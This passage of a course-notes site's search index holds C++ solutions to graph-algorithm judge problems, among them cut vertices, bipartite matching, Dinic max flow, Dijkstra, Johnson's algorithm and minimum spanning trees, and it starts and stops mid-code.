= v;\n    head[u] = idx;\n    ++ idx;\n    return;\n}\nvoid dfsearch(int x) {\n    ++ tsp;\n    low[x] = dfn[x] = tsp;\n    for (int i = head[x]; i != -1; i = nxt[i]) {\n        int e = to[i];\n        if (e == fa[x]) {\n            continue;\n        }\n        if (dfn[e] == 0) {\n            fa[e] = x;\n            ++ sons[x];\n            dfsearch(e);\n            low[x] = std::min(low[x], low[e]);\n        } else {\n            low[x] = std::min(low[x], dfn[e]);\n        }\n    }\n    if (fa[x] == -1 &amp;&amp; sons[x] &gt;= 2) {\n        if (!iscut[x]) {\n            ++ ans;\n        }\n        iscut[x] = true;\n    } else if (fa[x] != -1 &amp;&amp; fa[fa[x]] != -1 &amp;&amp; low[x] &gt;= dfn[fa[x]]) {\n        if (!iscut[fa[x]]) {\n            ++ ans;\n        }\n        iscut[fa[x]] = true;\n    }\n    return;\n}\n\nint main(void) {\n    memset(head, -1, sizeof(head));\n\n    int inpu, inpv;\n    scanf(\"%d%d\", &amp;n, &amp;m);\n    for (int i = 1; i &lt;= m; ++ i) {\n        scanf(\"%d%d\", &amp;inpu, &amp;inpv);\n        add(inpu, inpv);\n        add(inpv, inpu);\n    }\n    tsp = 0;\n    for (int i = 1; i &lt;= n; ++ i) {\n        if (dfn[i] == 0) {\n            fa[i] = -1;\n            dfsearch(i);\n        }\n    }\n    printf(\"%d\\n\", ans);\n    for (int i = 1; i &lt;= n; ++ i) {\n        if (iscut[i]) {\n            printf(\"%d \", i);\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1004/","title":"P1004","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\nconst int N = 5010;\nint n, m, q;\nint head[N], nxt[N &lt;&lt; 1], to[N &lt;&lt; 1], idx;\nstd::queue&lt;int&gt; que, queano;\nbool vis[N], visano[N];\nstd::vector&lt;int&gt; ddd[N];\nint dep[N], depano[N];\nint func[N][N];\n\n\nvoid add(int u, int v) {\n    nxt[idx] = head[u];\n    to[idx] = v;\n    head[u] = idx;\n    ++ idx;\n    return;\n}\nvoid dist(int x, std::vector&lt;int&gt; &amp;dis) {\n    dis.resize(n + 1);\n    dis[x] = 0;\n    vis[x] = true;\n    que.push(x);\n    while (!que.empty()) {\n        int t = que.front();\n        que.pop();\n        for (int i = head[t]; i != -1; i = nxt[i]) {\n            int e = to[i];\n            if (!vis[e]) {\n                vis[e] = true;\n                dis[e] = dis[t] + 1;\n                que.push(e);\n            }\n        }\n    }\n    for (int i = 1; i &lt;= n; ++ i) {\n        vis[i] = false;\n    }\n    return;\n}\nvoid bfsearch(int x, int z) {\n    dep[x] = 0;\n    vis[x] = true;\n    que.push(x);\n    while (!que.empty()) {\n        int t = que.front();\n        que.pop();\n        for (int i = head[t]; i != -1; i = nxt[i]) {\n            int e = to[i];\n            if (!vis[e] &amp;&amp; ddd[z][e] + dep[t] + 1 == ddd[z][x]) {\n                vis[e] = true;\n                dep[e] = dep[t] + 1;\n                que.push(e);\n            }\n        }\n        depano[x] = 0;\n        queano.push(t);\n        while (!queano.empty()) {\n            int tano = queano.front();\n            queano.pop();\n            for (int i = head[tano]; i != -1; i = nxt[i]) {\n                int eano = to[i];\n                if (!depano[eano] &amp;&amp; ddd[z][eano] == ddd[z][t] + depano[tano] + 1) {\n                    depano[eano] = depano[tano] + 1;\n                    queano.push(eano);\n                    func[x][eano] = std::min(func[x][eano], ddd[z][x] + depano[eano]);\n                }\n            }\n        }\n    }\n    for (int i = 1; i &lt;= n; ++ i) {\n        vis[i] = visano[i] = false;\n        depano[i] = 0;\n    }\n    return;\n}\n\nint main(void) {\n    memset(head, -1, sizeof(head));\n\n    int inpu, inpv, inpo, inpa, inpb, inpc;\n    scanf(\"%d%d%d\", &amp;n, &amp;m, &amp;q);\n    for (int i = 1; i &lt;= m; ++ i) {\n        scanf(\"%d%d\", &amp;inpu, &amp;inpv);\n        add(inpu, inpv);\n        add(inpv, inpu);\n    }\n    for (int i = 1; i &lt;= n; ++ i) {\n        dist(i, ddd[i]);\n    }\n\n    for (int i = 1; i &lt;= q; ++ i) {\n        scanf(\"%d\", &amp;inpo);\n        if (inpo == 1) {\n            scanf(\"%d%d\", &amp;inpu, &amp;inpv);\n            printf(\"%d\\n\", ddd[inpu][inpv]);\n        } else if (inpo == 2) {\n            scanf(\"%d%d%d\", &amp;inpa, &amp;inpb, &amp;inpc);\n            for (int j = 1; j &lt;= n; ++ j) {\n                for (int k = 1; k &lt;= n; ++ k) {\n                    func[j][k] = 0x3f3f3f3f;\n                }\n                func[j][j] = ddd[inpc][j];\n            }\n            for (int j = 1; j &lt;= n; ++ j) {\n                bfsearch(j, inpc);\n            }\n            int ans = 0x3f3f3f3f;\n            for (int j = 1; j &lt;= n; ++ j) {\n                if (ddd[inpa][j] + ddd[j][inpc] != ddd[inpa][inpc]) {\n                    continue;\n                }\n                for (int k = 1; k &lt;= n; ++ k) {\n                    if (ddd[inpa][j] + ddd[j][k] + ddd[k][inpb] != ddd[inpa][inpb]) {\n                        continue;\n                    }\n                    if (ddd[inpb][k] + ddd[k][inpc] != ddd[inpb][inpc]) {\n                        continue;\n                    }\n                    ans = std::min(ans, ddd[inpa][inpb] + func[j][k]);\n                }\n            }\n            printf(\"%d\\n\", ans);\n        }\n    }\n\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1005/","title":"P1005","text":"<p>\u540c P1004</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1006/","title":"P1006","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\nconst int N = 400010, M = 800010;\nint t, n, m;\nint head[N], nxt[M &lt;&lt; 1], to[M &lt;&lt; 1], idx;\nint color[N];\n\nvoid add(int u, int v) {\n    nxt[idx] = head[u];\n    to[idx] = v;\n    head[u] = idx;\n    ++ idx;\n    return;\n}\nbool dfsearch(int u, int nowcol) {\n    color[u] = nowcol;\n    for (int i = head[u]; i != -1; i = nxt[i]) {\n        int e = to[i];\n        if (color[e] == 0) {\n            if (!dfsearch(e, -nowcol)) {\n                return false;\n            }\n        } else {\n            if (color[e] == nowcol) {\n                return false;\n            }\n        }\n    }\n    return true;\n}\n\nint main(void) {\n    scanf(\"%d\", &amp;t);\n    while (t --) {\n        scanf(\"%d%d\", &amp;n, &amp;m);\n        for (int i = 1; i &lt;= n; ++ i) {\n            head[i] = -1;\n            color[i] = 0;\n        }\n        idx = 0;\n        int inpu, inpv;\n        for (int i = 1; i &lt;= m; ++ i) {\n            scanf(\"%d%d\", &amp;inpu, &amp;inpv);\n            add(inpu, inpv);\n            add(inpv, inpu);\n        }\n        bool flag = true;\n        for (int i = 1; i &lt;= n &amp;&amp; flag; ++ i) {\n            if (color[i] == 0) {\n                flag = dfsearch(i, 1);\n            }\n        }\n        puts(flag ? \"Y\" : \"N\");\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1007/","title":"P1007","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\nconst int N = 500010, M = N &lt;&lt; 1;\nint t, n, m;\nint deg[N];\nbool pass[M];\nint head[N], nxt[M &lt;&lt; 1], to[M &lt;&lt; 1], idx;\nint cur[N];\nint stk[M], top; \n\nvoid add(int u, int v) {\n    nxt[idx] = head[u];\n    to[idx] = v;\n    head[u] = idx;\n    ++ idx;\n    return;\n}\nvoid dfsearch(int x) { \n    for ( ; cur[x] != -1; cur[x] = nxt[cur[x]]) {\n        if (pass[cur[x] &gt;&gt; 1]) {\n            continue;\n        }\n        pass[cur[x] &gt;&gt; 1] = true;\n        dfsearch(to[cur[x]]);\n        if (cur[x] == -1) {\n            break;\n        }\n    }\n    ++ top, stk[top] = x;\n    return;\n}\n\nint main(void) {\n    scanf(\"%d\", &amp;t);\n    while (t --) {\n        scanf(\"%d%d\", &amp;n, &amp;m);\n\n        idx = 0;\n        for (int i = 1; i &lt;= n; ++ i) {\n            head[i] = -1;\n            deg[i] = 0;\n        }\n        for (int i = 0; i &lt; m; ++ i) {\n            pass[i] = false;\n        }\n\n        int inpu, inpv;\n        for (int i = 1; i &lt;= m; ++ i) {\n            scanf(\"%d%d\", &amp;inpu, &amp;inpv);\n            add(inpu, inpv);\n            add(inpv, inpu);\n            ++ deg[inpu], ++ deg[inpv];\n        }\n        int oddcnt = 0, oddpt1 = -1, oddpt2 = -1;\n        for (int i = 1; i &lt;= n; ++ i) {\n            if (deg[i] &amp; 1) {\n                ++ oddcnt;\n                if (oddpt1 == -1) {\n                    oddpt1 = i;\n                } else if (oddpt2 == -1) {\n                    oddpt2 = i;\n                }\n            }\n        }\n\n        if (oddcnt != 0 &amp;&amp; oddcnt != 2) {\n            puts(\"No\");\n        } else {\n            for (int i = 1; i &lt;= n; ++ i) {\n                cur[i] = head[i];\n            }\n            if (oddpt1 != -1) {\n                dfsearch(oddpt1);\n            } else {\n                for (int i = 1; i &lt;= n; ++ i) {\n                    if (deg[i]) {\n                        dfsearch(i);\n                        break;\n                    }\n                }\n            }\n            if (top != m + 1) {\n                puts(\"No\");\n            } else {\n                puts(\"Yes\");\n                printf(\"%d\\n\", m + 1);\n                for (int i = top; i &gt;= 1; -- i) {\n                    printf(\"%d \", stk[i]);\n                }\n                puts(\"\");\n            }\n            top = 0;\n        }\n\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1008/","title":"P1008","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\nconst int N = 500010, M = 2000010;\nint n, m;\nint head[N], nxt[M &lt;&lt; 1], to[M &lt;&lt; 1], idx;\nint dfn[N], low[N], tsp;\nint stk[N], top, root;\nint vdcc;\nstd::vector&lt;int&gt; pts[N];\n\nvoid add(int u, int v) {\n    nxt[idx] = head[u];\n    to[idx] = v;\n    head[u] = idx;\n    ++ idx;\n    return;\n}\nvoid dfsearch(int u, int last_ed) {\n    ++ tsp;\n    dfn[u] = low[u] = tsp;\n    ++ top;\n    stk[top] = u;\n\n    if (u == root &amp;&amp; head[u] == -1) {\n        ++ vdcc;\n        pts[vdcc].push_back(u);\n        return;\n    }\n    for (int i = head[u]; i != -1; i = nxt[i]) {\n        int e = to[i];\n        if (!dfn[e]) {\n            dfsearch(e, i);\n            low[u] = std::min(low[u], low[e]);\n            if (dfn[u] &lt;= low[e]) {\n                int topele;\n                ++ vdcc;\n                do {\n                    topele = stk[top];\n                    -- top;\n                    pts[vdcc].push_back(topele);\n                } while (topele != e);\n                pts[vdcc].push_back(u);\n            }\n        } else if ((i xor 1) != last_ed) {\n            low[u] = std::min(low[u], dfn[e]);\n        }\n    }\n\n    return;\n}\n\n\nint main(void) {\n    memset(head, -1, sizeof(head));\n    idx = 0;\n\n    int inpu, inpv;\n    scanf(\"%d%d\", &amp;n, &amp;m);\n    for (int i = 1; i &lt;= m; ++ i) {\n        scanf(\"%d%d\", &amp;inpu, &amp;inpv);\n        if (inpu == inpv) {\n            continue;\n        }\n        add(inpu, inpv);\n        add(inpv, inpu);\n    }\n    tsp = 0, top = 0, vdcc = 0;\n    for (int i = 1; i &lt;= n; ++ i) {\n        if (!dfn[i]) {\n            root = i;\n            dfsearch(i, -1);\n        }\n    }\n    printf(\"%d\\n\", vdcc);\n    for (int i = 1; i &lt;= vdcc; ++ i, puts(\"\")) {\n        int len = pts[i].size();\n        printf(\"%d \", len);\n        for (int j = 0; j &lt; len; ++ j) {\n            printf(\"%d \", pts[i][j]);\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1009/","title":"P1009","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\nconst int N = 1010, M = 50010;\nint t, n, m, e;\nint head[N], nxt[M &lt;&lt; 1], to[M &lt;&lt; 1], idx;\nbool vis[N];\nint match[N];\n\nvoid add(int u, int v) {\n    nxt[idx] = head[u];\n    to[idx] = v;\n    head[u] = idx;\n    ++ idx;\n    return;\n}\nbool matching(int u) {\n    for (int i = head[u]; i != -1; i = nxt[i]) {\n        int v = to[i];\n        if (vis[v]) {\n            continue;\n        }\n        vis[v] = true;\n        if (!match[v] || matching(match[v])) {\n            match[v] = u;\n            return true;\n        }\n    }\n    return false;\n}\nint max_matching(void) {\n    int res = 0;\n    for (int i = 1; i &lt;= n; ++ i) {\n        for (int j = 1; j &lt;= n + m; ++ j) {\n            vis[j] = false;\n        }\n        res += int(matching(i));\n    }\n    return res;\n}\n\nint main(void) {\n    scanf(\"%d\", &amp;t);\n    while (t --) {\n        scanf(\"%d%d%d\", &amp;n, &amp;m, &amp;e);\n\n        for (int i = 1; i &lt;= n + m; ++ i) {\n            head[i] = -1;\n            match[i] = 0;\n        }\n        idx = 0;\n\n        int inpu, inpv;\n        for (int i = 1; i &lt;= e; ++ i) {\n            scanf(\"%d%d\", &amp;inpu, &amp;inpv);\n            add(inpu, n + inpv);\n            add(n + inpv, inpu);\n        }\n        int ans = max_matching();\n        printf(\"%d\\n\", ans);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1010/","title":"P1010","text":"<p>\u672c\u6765\u8be5\u4f7f\u7528 Hopcroft \u7b97\u6cd5\u7684\uff0c\u6700\u7ec8\u5199\u4e86 Dinic\uff0cHopcroft \u7b97\u6cd5\u6709\u65f6\u95f4\u518d\u6765\u8865\u5427</p> <pre><code>#include &lt;bits/stdc++.h&gt;\nusing i64 = long long;\n\nconst int N = 20010, M = (1000010 + N) &lt;&lt; 1;\nconst i64 INF = 0x3f3f3f3f3f3f3f3f;\nint T;\nint n, m, s, t;\nint head[N], to[M], cap[M], nxt[M], idx = 0;\nint dep[N], cur[N];\n\nvoid add(int u, int v, int c)\n{\n    to[idx] = v;\n    cap[idx] = c;\n    nxt[idx] = head[u];\n    head[u] = idx; ++ idx; return;\n}\nvoid biadd(int u, int v, int c)\n{\n    add(u, v, c), add(v, u, 0);\n    return;\n}\nstd::queue&lt;int&gt; q;\nbool bfsearch(void)\n{\n    q = std::queue&lt;int&gt;();\n    for (int i = 1; i &lt;= n + m + 2; ++ i) {\n        dep[i] = -1;\n    }\n    dep[s] = 0, cur[s] = head[s], q.push(s);\n\n    while (!q.empty())\n    {\n        int fro = q.front(); q.pop();\n        for (int i = head[fro]; i != -1; i = nxt[i])\n        {\n            int e = to[i];\n            if (dep[e] == -1 &amp;&amp; cap[i])\n            {\n                cur[e] = head[e];\n                dep[e] = dep[fro] + 1;\n                if (e == t) return true;\n                q.push(e);\n            }\n        }\n    }\n    return false;\n}\ni64 extraRoad(int u, i64 lim)\n{\n    if (u == t) return lim;\n    i64 flow = 0;\n    for (int i = cur[u]; i != -1 &amp;&amp; flow &lt; lim; i = nxt[i])\n    {\n        cur[u] = i; int e = to[i];\n        if (dep[e] == dep[u] + 1 &amp;&amp; cap[i])\n        {\n            int del = extraRoad(e, std::min(1ll * cap[i], lim - flow));\n            if (!del) dep[e] = -1;\n            flow += del, cap[i] -= del, cap[i xor 1] += del;\n        }\n    }\n    return flow;\n}\ni64 Dinic(void)\n{\n    i64 res = 0, flow;\n    while (bfsearch())\n        while (flow = extraRoad(s, INF))\n            res += flow;\n    return res;\n}\n\nint main(void)\n{\n    scanf(\"%d\", &amp;T);\n    while (T --) {\n        int e, inpu, inpv;\n        scanf(\"%d%d%d\", &amp;n, &amp;m, &amp;e);\n\n        for (int i = 1; i &lt;= n + m + 2; ++ i) {\n            head[i] = -1;\n        }\n        idx = 0;\n\n        s = n + m + 1, t = n + m + 2;\n        for (int i = 1; i &lt;= e; ++ i) {\n            scanf(\"%d%d\", &amp;inpu, &amp;inpv);\n            biadd(inpu, n + inpv, 1);\n        }\n        for (int i = 1; i &lt;= n; ++ i) {\n            biadd(s, i, 1);\n        }\n        for (int i = n + 1; i &lt;= n + m; ++ i) {\n            biadd(i, t, 1);\n        }\n        printf(\"%lld\\n\", Dinic());\n    }\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1011/","title":"P1011","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\ntypedef long long i64;\ntypedef std::pair&lt;i64, int&gt; PLI;\nconst int N = 200010, M = 400010;\nconst i64 INF = 0x3f3f3f3f3f3f3f3f;\nint n, m, s;\nint head[N], nxt[M &lt;&lt; 1], to[M &lt;&lt; 1], wt[M &lt;&lt; 1], idx;\ni64 dis[N];\nbool rem[N];\nstd::priority_queue&lt;PLI, std::vector&lt;PLI &gt;, std::greater&lt;PLI &gt; &gt; q;\n\nvoid add(int u, int v, int w) {\n    nxt[idx] = head[u];\n    to[idx] = v;\n    wt[idx] = w;\n    head[u] = idx;\n    ++ idx;\n    return;\n}\nvoid dijkstra(void) {\n\n    for (int i = 1; i &lt;= n; ++ i) {\n        dis[i] = INF;\n        rem[i] = false;\n    }\n    dis[s] = 0;\n    q.push(std::make_pair(dis[s], s));\n\n    while (!q.empty()) {\n        int t = q.top().second;\n        q.pop();\n        if (rem[t]) {\n            continue;\n        }\n        for (int i = head[t]; i != -1; i = nxt[i]) {\n            int e = to[i], w = wt[i];\n            if (!rem[e] &amp;&amp; dis[e] &gt; dis[t] + w) {\n                dis[e] = dis[t] + w;\n                q.push(std::make_pair(dis[e], e));\n            }\n        }\n    }\n    return;\n}\n\nint main(void) {\n    memset(head, -1, sizeof(head));\n    int inpu, inpv, inpw;\n\n    scanf(\"%d%d%d\", &amp;n, &amp;m, &amp;s);\n    for (int i = 1; i &lt;= m; ++ i) {\n        scanf(\"%d%d%d\", &amp;inpu, &amp;inpv, &amp;inpw);\n        add(inpu, inpv, inpw);\n        add(inpv, inpu, inpw);\n    }\n    dijkstra();\n    for (int i = 1; i &lt;= n; ++ i) {\n        printf(\"%lld \", dis[i]);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1012/","title":"P1012","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\ntypedef long long i64;\ntypedef std::pair&lt;i64, int&gt; PLI;\nconst int N = 200010, M = 400010;\nconst i64 INF = 0x3f3f3f3f3f3f3f3f;\nint n, m, s, uw;\nint head[N], nxt[M &lt;&lt; 1], to[M &lt;&lt; 1], wt[M &lt;&lt; 1], idx;\ni64 dis[N];\nbool rem[N];\nstd::priority_queue&lt;PLI, std::vector&lt;PLI &gt;, std::greater&lt;PLI &gt; &gt; q;\nbool safe[N];\n\nvoid add(int u, int v, int w) {\n    nxt[idx] = head[u];\n    to[idx] = v;\n    wt[idx] = w;\n    head[u] = idx;\n    ++ idx;\n    return;\n}\nvoid dijkstra(void) {\n\n    for (int i = 1; i &lt;= n; ++ i) {\n        dis[i] = INF;\n        rem[i] = false;\n    }\n    dis[s] = 0;\n    q.push(std::make_pair(dis[s], s));\n\n    while (!q.empty()) {\n        int t = q.top().second;\n        q.pop();\n        if (rem[t]) {\n            continue;\n        }\n        for (int i = head[t]; i != -1; i = nxt[i]) {\n            int e = to[i], w = wt[i];\n            if (!rem[e] &amp;&amp; dis[e] &gt; dis[t] + w) {\n                dis[e] = dis[t] + w;\n                q.push(std::make_pair(dis[e], e));\n            }\n        }\n    }\n    return;\n}\ni64 myABS(i64 x) {\n    return (x &gt;= 0) ? x : (-x);\n}\n\nint main(void) {\n    memset(head, -1, sizeof(head));\n    int inpu, inpv, inpw;\n\n    scanf(\"%d%d%d%d\", &amp;n, &amp;m, &amp;s, &amp;uw);\n    for (int i = 1; i &lt;= m; ++ i) {\n        scanf(\"%d%d%d\", &amp;inpu, &amp;inpv, &amp;inpw);\n        add(inpu, inpv, inpw);\n        add(inpv, inpu, inpw);\n    }\n    dijkstra();\n    for (int i = 1; i &lt;= n; ++ i) {\n        safe[i] = false;\n        int cnt = 0;\n        for (int j = head[i]; j != -1; j = nxt[j]) {\n            int p = to[j], w = wt[j];\n            if (dis[p] + w == dis[i]) {\n                ++ cnt;\n            }\n        }\n        if (cnt &gt; 1) {\n            safe[i] = true;\n        }\n    }\n    i64 ans = 0;\n    for (int i = 1; i &lt;= n; ++ i) {\n        for (int j = head[i]; j != -1; j = nxt[j]) {\n            int e = to[j], w = wt[j];\n            if (e &lt;= i) {\n                continue;\n            }\n            i64 del;\n            if (dis[i] + w == dis[e]) {\n                del = (safe[e] ? (w - 1) : (uw - 1));\n            } else if (dis[e] + w == dis[i]) {\n                del = (safe[i] ? (w - 1) : (uw - 1));\n            } else {\n                del = std::max(0ll, myABS(dis[i] - dis[e]) - 1);\n                // \u6b64\u5904\u5b9e\u9645\u5e94\u4e3a std::min(myABS(dis[i] - dis[e]) - 1, uw).\n                // \u4f46\u53d6 uw \u4e0d\u53ef\u80fd.\n            }\n            ans += del;\n        }\n    }\n    printf(\"%lld\\n\", ans);\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1013/","title":"P1013","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\nconst int N = 510;\nint n;\nint d[N][N];\n\nint main(void) {\n\n    scanf(\"%d\", &amp;n);\n    for (int i = 1; i &lt;= n; ++ i) {\n        for (int j = 1; j &lt;= n; ++ j) {\n            scanf(\"%d\", &amp;d[i][j]);\n        } \n    }\n    for (int k = 1; k &lt;= n; ++ k) {\n        for (int i = 1; i &lt;= n; ++ i) {\n            for (int j = 1; j &lt;= n; ++ j) {\n                d[i][j] = std::min(d[i][j], d[i][k] + d[k][j]);\n            }\n        }\n    }\n    for (int i = 1; i &lt;= n; ++ i, puts(\"\")) {\n        for (int j = 1; j &lt;= n; ++ j) {\n            printf(\"%d \", d[i][j]);\n        }   \n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1014/","title":"P1014","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\ntypedef std::pair&lt;int, int&gt; PII;\nconst int N = 2510, M = 10010 + N, LIM = 500000000;\nint n, m;\nint head[N], nxt[M], to[M], wt[M], idx;\nint h[N];\nint d[N][N];\nbool outq[N];\nstd::priority_queue&lt;PII, std::vector&lt;PII &gt;, std::greater&lt;PII &gt; &gt; q;\n\nint myABS(int x) {\n    return (x &gt;= 0) ? x : (-x);\n}\nvoid add(int u, int v, int w) {\n    nxt[idx] = head[u];\n    to[idx] = v;\n    wt[idx] = w;\n    head[u] = idx;\n    ++ idx;\n    return;\n}\nvoid bellmanford(int s) {\n    memset(h, 0x3f, sizeof(h));\n    h[n + 1] = 0;\n\n    for (int i = 1; i &lt; n; ++ i) {\n        for (int j = 1; j &lt;= n + 1; ++ j) {\n            for (int k = head[j]; k != -1; k = nxt[k]) {\n                int v = to[k], w = wt[k];\n                h[v] = std::min(h[v], h[j] + w);\n            }\n        }\n    }\n\n    return;\n}\nvoid dijkstra(int s) {\n    for (int i = 1; i &lt;= n; ++ i) {\n        outq[i] = false;\n    }\n    d[s][s] = 0;\n    q.push(std::make_pair(d[s][s], s));\n\n    while (!q.empty()) {\n        int x = q.top().second;\n        q.pop();\n        if (outq[x]) {\n            continue;\n        }\n        outq[x] = true;\n\n        for (int i = head[x]; i != -1; i = nxt[i]) {\n            int v = to[i], w = wt[i] + h[x] - h[v];\n            if (d[s][v] &gt; d[s][x] + w) {\n                d[s][v] = d[s][x] + w;\n                q.push(std::make_pair(d[s][v], v));\n            }\n        }\n    }\n\n    return;\n}\n\nint main(void) {\n    memset(head, -1, sizeof(head));\n\n    scanf(\"%d%d\", &amp;n, &amp;m);\n    for (int i = 1, inpu, inpv, inpw; i &lt;= m; ++ i) {\n        scanf(\"%d%d%d\", &amp;inpu, &amp;inpv, &amp;inpw);\n        add(inpu, inpv, inpw);\n    }\n    for (int i = 1; i &lt;= n; ++ i) {\n        add(n + 1, i, 0);\n    }\n    bellmanford(n + 1);\n\n    memset(d, 0x3f, sizeof(d));\n    for (int i = 1; i &lt;= n; ++ i) {\n        dijkstra(i);\n    }\n    for (int i = 1; i &lt;= n; ++ i) {\n        int res = 0;\n        for (int j = 1; j &lt;= n; ++ j) {\n            d[i][j] -= h[i] - h[j];\n            if (d[i][j] &lt; LIM) {\n                res xor_eq (j + myABS(d[i][j]));\n            } else {\n                res xor_eq j;\n            }\n        }\n        printf(\"%d \", res);\n    }\n\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1015/","title":"P1015","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\ntypedef long long i64;\nconst int N = 200010, M = 500010;\nint n, m;\nstruct DSU {\n    int pa[N], large[N];\n\n    void init(int upb) {\n        for (int i = 1; i &lt;= upb; ++ i) {\n            pa[i] = i, large[i] = 1;\n        }\n        return;\n    }\n    int find(int x) {\n        return (x == pa[x]) ? x : (pa[x] = find(pa[x]));\n    }\n    void unify(int x, int y) {\n        x = find(x), y = find(y);\n        if (x == y) {\n            return;\n        }\n        if (large[x] &lt; large[y]) {\n            pa[x] = y;\n            large[y] += large[x];\n        } else {\n            pa[y] = x;\n            large[x] += large[y];\n        }\n        return;\n    }\n}dsu;\nstruct Edge {\n    int u, v, w;\n}e[M];\n\nbool cmp(const Edge &amp;x, const Edge &amp;y) {\n    return x.w &lt; y.w;\n}\n\nint main(void) {\n    scanf(\"%d%d\", &amp;n, &amp;m);\n    dsu.init(n);\n    for (int i = 1; i &lt;= m; ++ i) {\n        scanf(\"%d%d%d\", &amp;e[i].u, &amp;e[i].v, &amp;e[i].w);\n    }\n    std::sort(e + 1, e + m + 1, cmp);\n\n    for (int i = 1; i &lt;= m; ++ i) {\n        if (dsu.find(e[i].u) != dsu.find(e[i].v)) {\n            dsu.unify(e[i].u, e[i].v);\n            printf(\"%d\\n\", dsu.large[dsu.find(e[i].u)]);\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1016/","title":"P1016","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\ntypedef long long i64;\nconst int N = 5010, inf = 0x3f3f3f3f;\nint n;\nint t[N], b[N];\nint est[N];\nbool vis[N];\n\ni64 prim(void) {\n    i64 ans = 0;\n    for (int i = 1; i &lt;= n; ++ i) {\n        est[i] = -1;\n        vis[i] = false;\n    }\n    est[1] = 0;\n    for (int i = 1; i &lt;= n; ++ i) {\n        int maxn = -1, id = -1;\n        for (int j = 1; j &lt;= n; ++ j) {\n            if (!vis[j]) {\n                if (maxn &lt; est[j]) {\n                    maxn = est[j];\n                    id = j;\n                }\n            }\n        }\n        if (id == -1) {\n            puts(\"Something was wrong.\");\n            exit(0);\n        }\n        ans += maxn;\n        vis[id] = true;\n        for (int j = 1; j &lt;= n; ++ j) {\n            est[j] = std::max(est[j], std::min(t[id] xor b[j], b[id] xor t[j]));\n        }\n    }\n\n    return ans;\n}\n\nint main(void) {\n\n    scanf(\"%d\", &amp;n);\n    for (int i = 1; i &lt;= n; ++ i) {\n        scanf(\"%d%d\", &amp;t[i], &amp;b[i]);\n    }\n    printf(\"%lld\\n\", prim());\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1017/","title":"P1017","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\ntypedef std::tuple&lt;int, int, int&gt; PI3;\nconst int N = 100010;\nint q, n;\nstd::set&lt;int&gt; vertices;\nstd::vector&lt;PI3 &gt; edges;\nstd::vector&lt;int&gt; out[N], in[N];\nstd::vector&lt;int&gt; twoout[N], twoin[N];\nstd::set&lt;int&gt; tmp;\n\nbool haveVertex(int x) {\n    return vertices.find(x) != vertices.end();\n}\nvoid add(int u, int v) {\n    out[u].push_back(v);\n    in[v].push_back(u);\n    return;\n}\nvoid biadd(int u, int v) {\n    twoout[u].push_back(v);\n    twoin[u].push_back(v);\n    twoout[v].push_back(u);\n    twoin[v].push_back(u);\n    return;\n}\n\nint main(void) {\n    scanf(\"%d\", &amp;q);\n    n = 0;\n    int inpo, inpu, inpv, inpx, inpt, inps;\n    for (int i = 1; i &lt;= q; ++ i) {\n        scanf(\"%d\", &amp;inpo);\n        if (inpo == 1) {\n            scanf(\"%d\", &amp;inpx);\n            if (!haveVertex(inpx)) {\n                vertices.insert(inpx);\n                ++ n;\n            }\n            printf(\"%d\\n\", n);\n        } else if (inpo == 2) {\n            scanf(\"%d%d%d\", &amp;inpu, &amp;inpv, &amp;inpt);\n            if (!haveVertex(inpu) || !haveVertex(inpv)) {\n                continue;\n            }\n            edges.push_back(std::make_tuple(inpu, inpv, inpt));\n            if (inpt == 0) {\n                biadd(inpu, inpv);\n            } else if (inpt == 1) {\n                add(inpu, inpv);\n            }\n        } else if (inpo == 3) {\n            scanf(\"%d\", &amp;inpx);\n            int indeg = in[inpx].size() + twoin[inpx].size();\n            int outdeg = out[inpx].size() + twoout[inpx].size();\n            printf(\"%d %d\\n\", indeg, outdeg);\n        } else if (inpo == 4) {\n            scanf(\"%d\", &amp;inps);\n            for (int j = 1; j &lt;= inps; ++ j) {\n                scanf(\"%d\", &amp;inpx);\n                tmp.insert(inpx);\n            }\n            int ans = 0;\n            for (auto it = tmp.begin(); it != tmp.end(); ++ it) {\n                int u = (*it);\n                if (!haveVertex(u)) {\n                    continue;\n                }\n                for (int j = 0, up = out[u].size(); j &lt; up; ++ j) {\n                    int v = out[u][j];\n                    if (tmp.find(v) == tmp.end()) {\n                        continue;\n                    }\n                    ++ ans;\n                }\n                for (int j = 0, up = 